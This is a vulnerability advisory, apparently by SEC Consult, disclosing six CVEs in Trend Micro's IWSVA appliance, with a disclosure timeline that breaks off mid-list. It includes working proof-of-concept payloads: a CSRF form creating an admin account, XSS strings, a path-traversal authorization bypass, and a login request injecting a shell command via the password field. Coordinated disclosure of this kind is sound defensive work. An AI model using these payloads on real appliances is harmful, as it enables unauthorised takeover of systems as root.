Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

Customers should also adhere to security best practices such as network
segmentation, limiting access to the admin panel or admins not being logged
on while surfing the web for CSRF mitigation.

SEC Consult highly recommends to perform a thorough security review of this
and similar Trend Micro products conducted by security professionals to
identify and resolve all security issues. Based on the identified issues
it is possible that further critical issues exist in those products.


Vulnerability overview/description:
-----------------------------------
1) CSRF Protection Bypass (CVE-2020-8461)
The IWSVA web interface checks that every request contains a valid CSRF token.
However, this check does not apply if the request contains a body that is
encoded as multipart/form-data. Therefore, an attacker can simply get the
victim's browser to send any request encoded as multipart/form-data without
requiring a valid CSRF token.

2) Cross-Site Scripting (CVE-2020-8462)
Several stored and reflected Cross-Site Scripting vulnerabilities have been
identified in the IWSVA web interface.

3) Authorization Bypass (CVE-2020-8463)
A global authorization check is performed to allow anonymous users access to
a very restricted set of paths (e.g. the login page). This check is performed by
checking that the first part of the requested path matches one of the allowed
paths (e.g. logon.jsp). This verification can be bypassed by sending request paths
in the form of /logon.jsp/../<actual path> which allows accessing other scripts.

4) Authentication Bypass/SSRF (CVE-2020-8464)
The IWSVA administration web interface does not perform all authentication
checks if the request is sent from localhost. However, as the IWSVA also operates
as an HTTP proxy, an attacker can send requests that appear to come from
localhost by accessing the admin interface through the proxy. This behavior
also exposes the administration interface to users that would normally only have
access to the HTTP proxy of the appliance.

5) Command Execution (CVE-2020-8465)
The IWSVA's update functionality allows administrators to upload system updates
provided by Trend Micro™ to the web interface. The code contained in these
updates is executed as root. No code authenticity checks are performed before
applying the update. Therefore, by combining this behavior with the previous
vulnerabilities an unauthenticated attacker can execute code as user root.

6) Unauthenticated Command Injection (CVE-2020-8466)
When the improved password hashing method is enabled (see release notes for
Service Pack 2 Patch 3 for instructions how to enable it) the appliance is
vulnerable to a command injection vulnerability affecting the password
submitted during login. Therefore, an unauthenticated attacker is able to
execute commands by providing a manipulated password.


Proof of concept:
-----------------
1) CSRF Protection Bypass (CVE-2020-8461)
The following fragment demonstrates this issue by adding the user "attacker" by
using the form enctype "multipart/form-data":

<form
action="https://<host>:8443/servlet/com.trend.iwss.gui.servlet.updateaccountadministration?accountop=add&allaccount=admin&accountType=local&accountnamelocal=attacker&accounttype=0&password_changed=true&PASS1=test&PASS2=test&description=&role_select=1&roleid=1"

    method="POST"
    enctype="multipart/form-data">
  <input type="hidden" name="x" value="y" />
  <input type="submit" value="Send" />
</form>


2) Cross-Site Scripting (CVE-2020-8462)
The following instances of stored and reflected cross-site scripting
vulnerabilities have been identified (all of these can be combined with CSRF
protection bypass).

 * Adding a user e.g. with the description <img src=x onerror=alert(1)>
   Executed in the user overview (login_accounts.jsp)
 * Sending a POST request like /logon_report.jsp?"><script>alert(1)</script>
   (this only works in Internet Explorer as other browsers URL-encode some
   of these characters)
 * The following path demonstrates a reflected XSS:
   /change_status.jsp?settings=--><script>alert(1)</script>


3) Authorization Bypass (CVE-2020-8463)
The following path demonstrates how the global authorization filter can be
bypassed. The effects of this vulnerability alone were not further investigated.
Only the effects when combined with vulnerability #4 were researched.

/logon.jsp/../<anything>.jsp


4) Authentication Bypass/SSRF (CVE-2020-8464)
The following script demonstrates how the proxy of the appliance at port 8080
can be used to access the administration interface. Vulnerability #3 was used
to bypass the global authorization filter. The request is being sent through
the proxy and because it appears to come from localhost other security
mechanisms are bypassed. This script adds a user "attacker".

[ Python exploit script removed from this advisory ]


5) Command Execution (CVE-2020-8465)
Updates to the IWSVA are released as Tar-Gz files that are structured as follows:

update.tgz
 MD5SUM.txt                 contains the output of md5sum *
 stargate_patch.tgz
  stargate_patch.ini        contains metadata
  stargate_patch_apply.sh   executed during update

The file contains no signature that is checked before the update is applied. The
code in stargate_patch_apply.sh can be executed with a single request.

Note: As file uploads are always sent as multipart/form-data the CSRF filter
is ineffective for system updates.


6) Unauthenticated Command Injection (CVE-2020-8466)
The following request demonstrates this issue:
--- snip ---
POST /uilogonsubmit.jsp HTTP/1.1
Host: testhost:8443
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

uid=admin&passwd=`id`+>/tmp/test+%23
--- snip ---

After this request has been executed, the file /tmp/test contains the following:

   uid=498(iscan) gid=499(iscan) groups=499(iscan)


When combining these vulnerabilities the following attack chains are possible:
 * An attacker on the internet could abuse the CSRF and Command Execution
   vulnerability to take over the appliance as root.
 * An attacker with access to the HTTP proxy port could abuse the
   authentication/authorization bypass vulnerabilities and the Command Execution
   vulnerability to take over the appliance as root without user/admin interaction.

A python exploit script that demonstrates the latter attack scenario has been
developed and provided to Trend Micro, which will not be released. Instead,
a short PoC video showing that an unauthenticated attacker can take over the
appliance as root has been made:

Vulnerable / tested versions:
-----------------------------
The version IWSVA 6.5 SP2 EN Patch 4 Build 1844 with Patch cpb1852 was tested.
This was the latest version at the time of discovery.


Vendor contact timeline:
------------------------
2019-08-14: Contacting vendor through security@...ndmicro.com
            Submitting advisory information encrypted (PGP).
2019-08-14: Vendor reply, they will take a look at the issue.
2019-08-14: SEC Consult provides additional information/notes and potential
            other security issues not included in the advisory as more
            internal product information & time would be necessary to further
            investigate them.
2019-09-02: Vendor reviewed and analyzed the advisory reports, having difficulties
            and needing more detailed steps to recreate and exploit the vulnerabilities
            CSRF could not be exploited/simulated internally, as a "CSRF token"
            is required.
2019-09-02: SEC Consult explained how and why CSRF is exploitable again, e.g.
            when the user admin is logged in and the PoC form is sent, a new
            user is automatically created.
            Asking the vendor whether we tested the latest available version
            (IWSVA 6.5SP2 EN Patch 4 Build 1844 (w/cpb1852)).
2019-09-03: Vendor is asking about more details on the other reported vulnerabilities;
            More detailed steps in recreating and exploiting the issues are
            requested. Furthermore, info on how the form data for the CSRF PoC
            is being sent.
2019-09-03: SEC Consult provides video how the CSRF issue can be exploited easily.
            Asking what further details would be necessary for the other vulnerabilities
            as we believe the proof of concepts to be sufficient to verify them
2019-09-17: No reply; asking vendor about the status.
2019-09-19: Vendor was able to verify only two vulnerabilities (CSRF & XSS)
            Claimed CSRF attack might not be feasible as attacker would require an
            authenticated admin's cookie.
            First fixes for XSS have been implemented by vendor.
            Issue 3, 4 and 6 could not be reproduced by vendor, PoC similar to the video
            requested. Analysis of issue 5 is ongoing.
2019-09-19: Explaining to the vendor what CSRF is and also providing external
            info such as OWASP;
            Requesting specifics on why vulnerabilities could not be reproduced.
            Asking for information when vendor expects to be able to provide
            a patch.
2019-09-25: Trend Micro PSIRT: no timeline can be provided currently as issues could not be
            reproduced yet.
2019-09-27: SEC Consult postpones advisory release, asking whether further support
            is needed.
2019-10-11: Asking if vulnerabilities could be reproduced by now.
2019-10-11: Trend Micro PSIRT: development team worked on the last three vulnerabilities (4-6),
            update will follow next week.
2019-10-21: Vendor sends PGP encrypted message that can't be decrypted.
2019-10-23: Vendor re-sends message unencrypted; vendor made some progress. Further
            info regarding the additionally provided notes requested.
2019-10-23: SEC Consult: providing more info again.
2019-10-30: Asking vendor again regarding release date
2019-11-04: Trend Micro PSIRT: Testing completed, patch should be ready today, localization
            needs more time.
            Discussing further responsible disclosure steps.
2019-11-09: Trend Micro PSIRT: No ETA yet on final patch because of localization.
2019-11-29: Asking for a status update.
2019-12-10: Trend Micro PSIRT: unexpected issues encountered, intended fix has been rolled back.
            Should know further information by end of the week.

            end users more time to patch the highly critical issues.
2020-01-27: No reply yet; SEC Consult informs vendor that we expect the patch
            to be released on 4th February and plan the advisory release for 19th February.
2020-01-29: Vendor sends PGP-encrypted email only for their email address; asking to
            resend it.
            Vendor resends email:
            Vendor is still working on patch (localization for different regions), should be
            available by February "if all goes well". Cannot commit to disclosure date yet,
            new date will be proposed.
2020-01-29: Taking next responsible disclosure steps, contacting CERT-Bund and CERT.at
            regarding scheduled release.

2020-02-06: Asking whether all issues have been fixed, based on the release notes it seems
            to us that XSS has not been fixed properly and only the "X-XSS-Protection"
            header has to be configured by admins now.
            Asking vendor for further info on this.
2020-02-07: Trend Micro Germany: The patch addresses all identified security issues:
                1) CSRF Protection Bypass            > VRTS-3552
